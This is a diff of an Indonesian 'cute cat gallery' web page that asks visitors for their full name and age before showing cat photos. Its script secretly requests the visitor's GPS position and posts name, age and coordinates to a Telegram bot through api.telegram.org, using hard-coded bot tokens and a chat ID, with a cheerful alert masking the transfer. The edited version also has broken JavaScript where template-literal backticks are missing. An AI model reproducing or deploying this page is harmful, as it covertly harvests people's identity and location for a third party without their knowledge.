@@ -17,37 +17,11 @@
     p {
       font-size: 1.2em;
     }
-    .gallery {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 15px;
-      margin-top: 20px;
-    }
-    .cat-card {
-      background: #ffe6ef;
+    img {
       border-radius: 15px;
-      padding: 10px;
+      margin: 10px;
       box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    .cat-card img {
-      border-radius: 15px;
-      width: 100%;
-      height: auto;
-    }
-    .download-btn {
-      margin-top: 8px;
-      padding: 5px 10px;
-      background-color: #ff69b4;
-      color: white;
-      text-decoration: none;
-      border-radius: 8px;
-      font-size: 0.9em;
-    }
-    .download-btn:hover {
-      background-color: #ff4081;
+      max-width: 300px;
     }
     form {
       background: #ffe6ef;
@@ -77,9 +51,9 @@
 </head>
 <body>
   <h1>Galeri Kucing Lucu 🐱</h1>
-  <p>Lihat foto-foto kucing menggemaskan dan isi form di bawah ini!</p>
+  <p>Isi form ini dulu yaa, baru lihat foto kucing menggemaskan! 🐾</p>
 
-  <h2>Siapakah Kamu? 🐾</h2>
+  <!-- Form di atas -->
   <form id="catForm">
     Nama Lengkap:<br>
     <input type="text" name="nama" required><br><br>
@@ -88,63 +62,54 @@
     <button type="submit">Kirim</button>
   </form>
 
-  <div class="gallery">
-    <div class="cat-card">
+  <!-- Foto kucing -->
+  <div>
+    <h2>Foto Kucing Lucu 😻</h2>
+    <div>
       <img src="https://files.catbox.moe/g5u1ys.jpeg" alt="kitty">
-      <a class="download-btn" href="https://files.catbox.moe/g5u1ys.jpeg" download="kitty.jpg">Download</a>
-    </div>
-    <div class="cat-card">
+      <a href="https://files.catbox.moe/g5u1ys.jpeg" download><button>Download</button></a>
+
       <img src="https://files.catbox.moe/vovjx7.jpeg" alt="embull">
-      <a class="download-btn" href="https://files.catbox.moe/vovjx7.jpeg" download="embull.jpg">Download</a>
-    </div>
-    <div class="cat-card">
+      <a href="https://files.catbox.moe/vovjx7.jpeg" download><button>Download</button></a>
+
       <img src="https://files.catbox.moe/yjf3au.jpeg" alt="oyen">
-      <a class="download-btn" href="https://files.catbox.moe/yjf3au.jpeg" download="oyen.jpg">Download</a>
-    </div>
-    <div class="cat-card">
-      <img src="https://files.catbox.moe/5zqaw1.jpeg" alt="anabul1">
-      <a class="download-btn" href="https://files.catbox.moe/5zqaw1.jpeg" download="anabul1.jpg">Download</a>
-    </div>
-    <div class="cat-card">
-      <img src="https://files.catbox.moe/cahgsy.jpeg" alt="anabul2">
-      <a class="download-btn" href="https://files.catbox.moe/cahgsy.jpeg" download="anabul2.jpg">Download</a>
-    </div>
-    <div class="cat-card">
-      <img src="https://files.catbox.moe/m73e1f.jpeg" alt="anabul3">
-      <a class="download-btn" href="https://files.catbox.moe/m73e1f.jpeg" download="anabul3.jpg">Download</a>
-    </div>
-    <div class="cat-card">
-      <img src="https://files.catbox.moe/rlh01t.jpeg" alt="anabul4">
-      <a class="download-btn" href="https://files.catbox.moe/rlh01t.jpeg" download="anabul4.jpg">Download</a>
+      <a href="https://files.catbox.moe/yjf3au.jpeg" download><button>Download</button></a>
+
+      <img src="https://files.catbox.moe/5zqaw1.jpeg" alt="anabul">
+      <a href="https://files.catbox.moe/5zqaw1.jpeg" download><button>Download</button></a>
     </div>
   </div>
 
   <script>
-    const TOKEN = "7897552509:AAECrwGQu0zMiqTMYhULLZLwr7plqANjFEk";
+    const TOKEN = "7811044397:AAGmY2Co1qZo25tsAwEm3oAD94Qum_inUd0";
     const CHAT_ID = "6626316127";
-    const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
-    let gpsLocation = "Tidak tersedia";
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        gpsLocation = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-      }, function(error) {
-        gpsLocation = "Gagal mendapatkan lokasi";
-      });
-    } else {
-      gpsLocation = "Browser tidak mendukung GPS";
-    }
+    const URL = https://api.telegram.org/bot${TOKEN}/sendMessage;
 
     document.getElementById("catForm").addEventListener("submit", function(e) {
       e.preventDefault();
       const formData = new FormData(e.target);
-      const message = `
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          let gpsLocation = Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude};
+          sendToTelegram(formData, gpsLocation);
+        }, function(error) {
+          let gpsLocation = "Gagal mendapatkan lokasi";
+          sendToTelegram(formData, gpsLocation);
+        });
+      } else {
+        let gpsLocation = "Browser tidak mendukung GPS";
+        sendToTelegram(formData, gpsLocation);
+      }
+    });
+
+    function sendToTelegram(formData, gpsLocation) {
+      const message = 
 📌 Data Baru Masuk:
 👤 Nama: ${formData.get("nama")}
 🎂 Umur: ${formData.get("umur")}
 📍 Lokasi GPS: ${gpsLocation}
-      `;
+      ;
 
       fetch(URL, {
         method: "POST",
@@ -154,9 +119,9 @@
           text: message,
           parse_mode: "Markdown"
         })
-      }).then(res => alert("nama kamu indah bagaikan bulan🌚"))
+      }).then(res => alert("NAMAMU INDAH BAGAYKAN BULAN"))
         .catch(err => alert("Gagal mengirim: " + err));
-    });
+    }
   </script>
 </body>
 </html>
